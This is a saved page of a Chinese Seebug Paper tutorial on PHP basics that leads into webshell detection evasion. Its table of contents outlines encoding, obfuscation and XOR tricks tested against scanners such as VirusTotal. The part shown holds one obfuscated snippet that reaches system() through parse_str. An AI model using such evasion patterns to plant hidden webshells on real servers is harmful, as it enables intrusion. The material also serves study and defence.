<!DOCTYPE html>
<!-- saved from url=(0030)https://paper.seebug.org/3044/ -->
<html xmlns:wb="http://open.weibo.com/wb"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta property="wb:webmaster" content="ccd3e79934f3322d">
  <title>PHP 从零学习到 Webshell 免杀手册</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术">
  <meta name="description" content="">

  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="shortcut icon" href="https://paper.seebug.org/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="./PHP 从零学习到 Webshell 免杀手册_files/bootstrap.min.css">
  <link rel="stylesheet" type="text/css" href="./PHP 从零学习到 Webshell 免杀手册_files/screen.css">
  <link rel="stylesheet" type="text/css" href="./PHP 从零学习到 Webshell 免杀手册_files/font.css">
  <link rel="stylesheet" type="text/css" href="./PHP 从零学习到 Webshell 免杀手册_files/plugin_comment.css">
  <link rel="stylesheet" href="./PHP 从零学习到 Webshell 免杀手册_files/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="./PHP 从零学习到 Webshell 免杀手册_files/prism.css">
  <link rel="stylesheet" type="text/css" href="./PHP 从零学习到 Webshell 免杀手册_files/monokai.css" media="screen">
  <link rel="stylesheet" type="text/css" href="./PHP 从零学习到 Webshell 免杀手册_files/custom.css">
  <link rel="stylesheet" type="text/css" href="./PHP 从零学习到 Webshell 免杀手册_files/print.css" media="print">
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/jquery.min.js.下载"></script>
<style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="./PHP 从零学习到 Webshell 免杀手册_files/weixin-share.png" alt="Paper">
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title">
        <img src="./PHP 从零学习到 Webshell 免杀手册_files/seebug-logo2023.png" alt="Seebug-logo" style="height: 56px;">
    </h2>
    <h3 class="blog-description">Paper - 安全技术精粹</h3>

    <form id="search" action="https://paper.seebug.org/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;"> </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search">

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="https://paper.seebug.org/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://paper.seebug.org/contribution/paper/"><i class="fa fa-envelope-o"></i>投稿</a></li>
          <li><a href="https://paper.seebug.org/rank/"><i class="glyphicon glyphicon-signal"></i>阅读榜</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/"><i class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/vul-analysis/"><i class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/tools/"><i class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/information/"><i class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/experience/"><i class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/web-security/"><i class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/bin-security/"><i class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/mobile-security/"><i class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/prime/"><i class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/ctf/"><i class="fa fa-angle-right"></i>CTF</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/IoT/"><i class="fa fa-angle-right"></i>IoT安全</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/blockchain/"><i class="fa fa-angle-right"></i>区块链</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/404team/"><i class="fa fa-angle-right"></i>404专栏</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/report/"><i class="fa fa-angle-right"></i>专题报告</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/404team-en/"><i class="fa fa-angle-right"></i>404 English Paper</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/threat-intelligence/"><i class="fa fa-angle-right"></i>威胁情报</a></li>

  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/AIsecurity/"><i class="fa fa-angle-right"></i>AI安全</a></li>


        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/call-for-paper/"><i class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
<article class="">
    <header class="post-header">

        <h1 class="post-title" id="2620">PHP 从零学习到 Webshell 免杀手册</h1>

        <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
        <section class="post-meta">
        <span class="post-time">
          <i class="fa fa-calendar"></i>
          <time datetime="2023-10-08" class="timeago">2023年10月08日</time>
          <time datetime="2023-10-08" class="fulldate">2023年10月08日</time>
        </span>
            
            <br>
            <i class="fa fa-tag"></i>
            
            <a href="https://paper.seebug.org/category/web-security/">Web安全</a>
            
            
            

            <!--                -->
            <!--                -->
            <!--                -->
            <!--                -->
            <!--                -->
            <!--                -->

        </section>
    </header>
    <div class="x_panel" id="md-catalog">
        <div class="x_title">
            <h2>目录</h2>
            <ul class="nav navbar-right panel_toolbox">
                <li><a class="collapse-link">
                    <i class="fa fa-chevron-up"></i>
                </a></li>
                <li><a class="close-link">
                    <i class="fa fa-times"></i>
                </a></li>
            </ul>
            <div class="clearfix"></div>
        </div>
        <div class="toc">
<ul>
<li><a href="https://paper.seebug.org/3044/#php">一、PHP相关资料</a></li>
<li><a href="https://paper.seebug.org/3044/#php_1">二、PHP函数速查</a><ul>
<li><a href="https://paper.seebug.org/3044/#0-php">0 PHP基础</a><ul>
<li><a href="https://paper.seebug.org/3044/#00-php">0.0 PHP基础格式</a></li>
<li><a href="https://paper.seebug.org/3044/#01">0.1 .=和+=赋值</a></li>
<li><a href="https://paper.seebug.org/3044/#02">0.2 数组</a></li>
<li><a href="https://paper.seebug.org/3044/#03">0.3 连接符</a></li>
<li><a href="https://paper.seebug.org/3044/#04">0.4 运算符</a></li>
<li><a href="https://paper.seebug.org/3044/#05">0.5 常量</a></li>
<li><a href="https://paper.seebug.org/3044/#06-php">0.6 PHP特性</a></li>
<li><a href="https://paper.seebug.org/3044/#07-php">0.7 PHP标记几种写法</a></li>
<li><a href="https://paper.seebug.org/3044/#08-_post">0.8 $_POST变量</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#1">1 回调类型函数</a><ul>
<li><a href="https://paper.seebug.org/3044/#10-tips">1.0 Tips</a></li>
<li><a href="https://paper.seebug.org/3044/#11-array_map">1.1 array_map()</a></li>
<li><a href="https://paper.seebug.org/3044/#12-register_shutdown_function">1.2 register_shutdown_function()</a></li>
<li><a href="https://paper.seebug.org/3044/#13-array_walk">1.3 array_walk()</a></li>
<li><a href="https://paper.seebug.org/3044/#14-array_filter">1.4 array_filter()</a></li>
<li><a href="https://paper.seebug.org/3044/#15-foreach">1.5 foreach()</a></li>
<li><a href="https://paper.seebug.org/3044/#16-isset">1.6 isset()</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#2">2 字符串处理类函数</a><ul>
<li><a href="https://paper.seebug.org/3044/#20-tips">2.0 Tips</a></li>
<li><a href="https://paper.seebug.org/3044/#21-substr">2.1 substr()</a></li>
<li><a href="https://paper.seebug.org/3044/#22-intval">2.2 intval()</a></li>
<li><a href="https://paper.seebug.org/3044/#23-parse_str">2.3 parse_str()</a></li>
<li><a href="https://paper.seebug.org/3044/#24-pack">2.4 pack()</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#3">3 命令执行类函数</a><ul>
<li><a href="https://paper.seebug.org/3044/#30-tips">3.0 Tips</a></li>
<li><a href="https://paper.seebug.org/3044/#31-eval">3.1 eval()</a></li>
<li><a href="https://paper.seebug.org/3044/#32-system">3.2 system()</a></li>
<li><a href="https://paper.seebug.org/3044/#32-exec">3.2 exec()</a></li>
<li><a href="https://paper.seebug.org/3044/#33-shell_exec">3.3 shell_exec()</a></li>
<li><a href="https://paper.seebug.org/3044/#34-passthru">3.4 passthru()</a></li>
<li><a href="https://paper.seebug.org/3044/#35-popen">3.5 popen()</a></li>
<li><a href="https://paper.seebug.org/3044/#36">3.6 反引号``</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#4">4 文件写入类函数</a><ul>
<li><a href="https://paper.seebug.org/3044/#40-tips">4.0 Tips</a></li>
<li><a href="https://paper.seebug.org/3044/#41-fwrite">4.1 fwrite()</a></li>
<li><a href="https://paper.seebug.org/3044/#42-file_put_contents">4.2 file_put_contents()</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#5">5 异常处理类函数</a><ul>
<li><a href="https://paper.seebug.org/3044/#50-tips">5.0 Tips</a></li>
<li><a href="https://paper.seebug.org/3044/#51-exception">5.1 Exception 类</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#6">6 数据库连接函数</a><ul>
<li><a href="https://paper.seebug.org/3044/#60-tips">6.0 Tips</a></li>
<li><a href="https://paper.seebug.org/3044/#61-sqlite">6.1 Sqlite数据库</a></li>
<li><a href="https://paper.seebug.org/3044/#62-mysql">6.2 MySQL数据库</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#7-php">7 PHP过滤器</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#webshell">三、Webshell免杀</a><ul>
<li><a href="https://paper.seebug.org/3044/#_1">学习后的免杀效果</a><ul>
<li><a href="https://paper.seebug.org/3044/#webshell_1">牧云Webshell检测引擎：</a></li>
<li><a href="https://paper.seebug.org/3044/#_2">微步在线云沙箱：</a></li>
<li><a href="https://paper.seebug.org/3044/#webshell_2">河马WebShell在线查杀：</a></li>
<li><a href="https://paper.seebug.org/3044/#webdir">百度WEBDIR+在线查杀：</a></li>
<li><a href="https://paper.seebug.org/3044/#virustotal">大名鼎鼎的VirusTotal：</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#0">0 免杀思路概述</a><ul>
<li><a href="https://paper.seebug.org/3044/#01-webshell">0.1 WebShell查杀思路</a></li>
<li><a href="https://paper.seebug.org/3044/#02-webshell">0.2 WebShell整体免杀思路</a></li>
<li><a href="https://paper.seebug.org/3044/#03-webshell">0.3 WebShell免杀注意点</a><ul>
<li><a href="https://paper.seebug.org/3044/#031-eval">0.3.1 eval() 高危函数</a></li>
<li><a href="https://paper.seebug.org/3044/#032-assert">0.3.2 assert() 高危函数</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#04-webshell">0.4 WebShell免杀测试</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#1_1">1 编码绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#11-base64">1.1 Base64编码</a></li>
<li><a href="https://paper.seebug.org/3044/#12-ascii">1.2 ASCII编码</a></li>
<li><a href="https://paper.seebug.org/3044/#13-rot13">1.3 ROT13编码</a></li>
<li><a href="https://paper.seebug.org/3044/#14-gzip">1.4 Gzip压缩加密</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#2_1">2 字符串混淆处理绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#21">2.1 自定义函数混淆字符串</a></li>
<li><a href="https://paper.seebug.org/3044/#22">2.2 自定义函数+文件名混淆</a></li>
<li><a href="https://paper.seebug.org/3044/#23">2.3 特殊字符串</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#3_1">3 生成新文件绕过</a></li>
<li><a href="https://paper.seebug.org/3044/#4_1">4 回调函数绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#41-call_user_func_array">4.1 call_user_func_array()</a></li>
<li><a href="https://paper.seebug.org/3044/#42-array_map">4.2 array_map()</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#5_1">5 可变变量绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#51">5.1 简单可变变量</a></li>
<li><a href="https://paper.seebug.org/3044/#52">5.2 数组+变量引用混淆</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#6_1">6 数组绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#61">6.1 一维数组</a></li>
<li><a href="https://paper.seebug.org/3044/#62">6.2 二维数组</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#7">7 类绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#71">7.1 单类</a></li>
<li><a href="https://paper.seebug.org/3044/#72">7.2 多类</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#8">8 嵌套运算绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#81">8.1 异或</a></li>
<li><a href="https://paper.seebug.org/3044/#82">8.2 嵌套运算</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#9">9 传参绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#91-base64">9.1 Base64传参</a></li>
<li><a href="https://paper.seebug.org/3044/#92">9.2 函数构造传参</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#10">10 自定义函数绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#101">10.1 简单自定义函数</a></li>
<li><a href="https://paper.seebug.org/3044/#102">10.2 读取已定义函数</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#11">11 读取字符串绕过</a><ul>
<li><a href="https://paper.seebug.org/3044/#111">11.1 读取注释</a></li>
<li><a href="https://paper.seebug.org/3044/#112">11.2 读取数据库</a></li>
<li><a href="https://paper.seebug.org/3044/#113">11.3 读取目录</a></li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#12">12 多姿势配合免杀</a><ul>
<li><a href="https://paper.seebug.org/3044/#121">12.1 样例一</a></li>
<li><a href="https://paper.seebug.org/3044/#122">12.2 样例二</a></li>
<li><a href="https://paper.seebug.org/3044/#123">12.3 样例三</a><ul>
<li><a href="https://paper.seebug.org/3044/#1231-token">12.3.1 第一步、密钥协商得到Token</a></li>
<li><a href="https://paper.seebug.org/3044/#1232-x-csrf-token">12.3.2 第二步，得到X-CSRF-TOKEN</a></li>
<li><a href="https://paper.seebug.org/3044/#1233">12.3.3 第三步，利用木马成功执行命令</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="https://paper.seebug.org/3044/#_3">四、总结</a></li>
</ul>
</div>

    </div>
    <section class="post-content">
        <p><strong>作者：曾哥 <br>
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org</strong></p>
<h1 id="php">一、PHP相关资料</h1>
<ul>
<li>PHP官方手册： <a href="https://www.php.net/manual/zh/" title="https://www.php.net/manual/zh/">https://www.php.net/manual/zh/</a>   </li>
<li>PHP函数参考： <a href="https://www.php.net/manual/zh/funcref.php" title="https://www.php.net/manual/zh/funcref.php">https://www.php.net/manual/zh/funcref.php</a>   </li>
<li>菜鸟教程： <a href="https://www.runoob.com/php/php-tutorial.html" title="https://www.runoob.com/php/php-tutorial.html">https://www.runoob.com/php/php-tutorial.html</a>   </li>
<li>w3school： <a href="https://www.w3school.com.cn/php/index.asp" title="https://www.w3school.com.cn/php/index.asp">https://www.w3school.com.cn/php/index.asp</a>     </li>
<li>渊龙Sec安全团队导航： <a href="https://dh.aabyss.cn/">https://dh.aabyss.cn</a>  </li>
<li>开源地址： <a href="https://github.com/AabyssZG/WebShell-Bypass-Guide" title="https://github.com/AabyssZG/WebShell-Bypass-Guide ">https://github.com/AabyssZG/WebShell-Bypass-Guide </a>   </li>
</ul>
<h1 id="php_1">二、PHP函数速查</h1>
<h2 id="0-php">0 PHP基础</h2>
<h3 id="00-php">0.0 PHP基础格式</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token php"><span class="token delimiter">&lt;?php</span>
   <span class="token comment" spellcheck="true"> //执行的相关PHP代码
</span><span class="token delimiter">?&gt;</span></span></code></pre>


<p>这是一个PHP文件的基本形式</p>
<h3 id="01">0.1 .=和+=赋值</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> //赋值
</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'b'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> //赋值
</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string">'c'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> //赋值
</span><span class="token variable">$c</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> //cab</span></code></pre>


<ul>
<li><code>.=</code> 通俗的说，就是累积</li>
<li><code>+=</code> 意思是：左边的变量的值加上右边的变量的值，再赋给左边的变量</li>
</ul>
<h3 id="02">0.2 数组</h3>
<p><strong>array() 函数用于创建数组</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$shuzu</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"AabyssZG"</span><span class="token punctuation">,</span><span class="token string">"AabyssTeam"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"My Name is "</span> <span class="token punctuation">.</span> <span class="token variable">$shuzu</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">", My Team is "</span> <span class="token punctuation">.</span> <span class="token variable">$shuzu</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"."</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">
//My Name is AabyssZG, My Team is AabyssTeam.</span></code></pre>


<p><strong>数组可嵌套：</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token string">'b[]=AabyssZG&amp;b[]=system'</span><span class="token punctuation">;</span>
<span class="token variable">$rce</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //用array函数新建数组
</span><span class="token function">parse_str<span class="token punctuation">(</span></span><span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> //这个函数下文有讲
</span><span class="token function">print_r<span class="token punctuation">(</span></span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p><code>$rce</code> 数组输出为：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">Array</span> <span class="token punctuation">(</span>
    <span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token keyword">Array</span>
        <span class="token punctuation">(</span>
            <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> AabyssZG
            <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> system
        <span class="token punctuation">)</span>
<span class="token punctuation">)</span></code></pre>


<p>这时候可以这样利用</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$rce</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span>参数<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //提取rce数组中的b数组内容，相当于system(参数)
</span><span class="token keyword">echo</span> <span class="token variable">$rce</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //AabyssZG</span></code></pre>


<p><strong>使用 [] 定义数组</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$z</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">;</span>
<span class="token variable">$z</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
<span class="token variable">$z</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'b'</span><span class="token punctuation">;</span>
<span class="token variable">$z</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'y'</span><span class="token punctuation">;</span>
<span class="token variable">$z</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span>
<span class="token variable">$z</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span></code></pre>


<p>这就是基本的一个数组，数组名为z，数组第一个成员为0，以此类推</p>
<p><strong>compact() 函数用于创建数组创建一个包含变量名和它们的值的数组</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$firstname</span> <span class="token operator">=</span> <span class="token string">"Aabyss"</span><span class="token punctuation">;</span>
<span class="token variable">$lastname</span> <span class="token operator">=</span> <span class="token string">"ZG"</span><span class="token punctuation">;</span>
<span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">"21"</span><span class="token punctuation">;</span>

<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">compact<span class="token punctuation">(</span></span><span class="token string">"firstname"</span><span class="token punctuation">,</span> <span class="token string">"lastname"</span><span class="token punctuation">,</span> <span class="token string">"age"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r<span class="token punctuation">(</span></span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>数组输出为：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span>firstname<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> Aabyss <span class="token punctuation">[</span>lastname<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token constant">ZG</span> <span class="token punctuation">[</span>age<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">21</span> <span class="token punctuation">)</span></code></pre>


<h3 id="03">0.3 连接符</h3>
<p><strong>. 最简的连接符</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$str1</span><span class="token operator">=</span><span class="token string">"hello"</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token string">"world"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$str1</span><span class="token punctuation">.</span><span class="token variable">$str2</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //helloworld</span></code></pre>


<h3 id="04">0.4 运算符</h3>
<p><strong>&amp; 运算符</strong></p>
<p>加减乘除应该不用我说了吧</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token punctuation">(</span><span class="token variable">$var</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"> //如果$var是一个奇数，则返回true；如果是偶数，则返回false</span></code></pre>


<p><strong>逻辑运算符</strong></p>
<p>特别是 <code>xor</code> 异或运算符，在一些场合需要用到</p>
<p><img alt="xor.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729083000-1xqbdi.png-w331s"></p>
<h3 id="05">0.5 常量</h3>
<p><strong>自定义常量</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">define<span class="token punctuation">(</span></span><span class="token string">'-_-'</span><span class="token punctuation">,</span><span class="token string">'smile'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //特殊符号开头，定义特殊常量
</span><span class="token function">define<span class="token punctuation">(</span></span><span class="token string">'wo'</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> wo <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></code></pre>


<p>常量的命名规则</p>
<ol>
<li>常量不需要使用 <code>$</code> 符号，一旦使用系统就会认为是变量；</li>
<li>常量的名字组成由字母、数字和下划线组成，不能以数字开头；</li>
<li>常量的名字通常是以大写字母为主，以区别于变量；</li>
<li>常量命名的规则比变量要松散，可以使用一些特殊字符，该方式只能使用 <code>define</code> 定义；</li>
</ol>
<p><strong>__FILE__ 常量（魔术常量）</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token constant">__FILE__</span><span class="token comment" spellcheck="true"> //返回文件的完整路径和文件名
</span>
<span class="token function">dirname<span class="token punctuation">(</span></span><span class="token constant">__FILE___</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"> //函数返回的是代码所在脚本的路径
</span>
<span class="token function">dirname<span class="token punctuation">(</span></span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"> //返回文件所在当前目录到系统根目录的一个目录结构（不会返回当前的文件名称）</span></code></pre>


<p><strong>其他魔术常量</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token constant">__DIR__</span>       <span class="token comment" spellcheck="true"> //当前被执行的脚步所在电脑的绝对路径
</span><span class="token constant">__LINE__</span>      <span class="token comment" spellcheck="true"> //当前所示的行数
</span><span class="token constant">__NAMESPACE__</span> <span class="token comment" spellcheck="true"> //当前所属的命名空间
</span><span class="token constant">__CLASS__</span>     <span class="token comment" spellcheck="true"> //当前所属的类
</span><span class="token constant">__METHOD__</span>    <span class="token comment" spellcheck="true"> //当前所属的方法</span></code></pre>


<h3 id="06-php">0.6 PHP特性</h3>
<ul>
<li>PHP中函数名、方法名、类名不区分大小写，常量和变量区分大小写</li>
<li>在某些环境中，<code>&lt;?php ?&gt;</code> 没有闭合会导致无法正常运作</li>
</ul>
<h3 id="07-php">0.7 PHP标记几种写法</h3>
<p>其中第一和第二种为常用的写法</p>
<pre class="codehilite language-php"><code class=" language-php">第一种：<span class="token php"><span class="token delimiter">&lt;?php</span> <span class="token delimiter">?&gt;</span></span>
第二种：<span class="token php"><span class="token delimiter">&lt;?php</span>
第三种：<span class="token delimiter">&lt;?</span> <span class="token delimiter">?&gt;</span></span>
第四种：<span class="token markup">&lt;% %&gt;</span>
第五种：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></span></code></pre>


<p>第三种和第四种为短标识，当使用他们需要开启 <code>php.ini</code> 文件中的 <code>short_open_tag</code> ，不然会报错</p>
<h3 id="08-_post">0.8 $_POST变量</h3>
<p>在 PHP 中，预定义的 <code>$_POST</code> 变量用于收集来自 <code>method="post"</code> 的表单中的值</p>
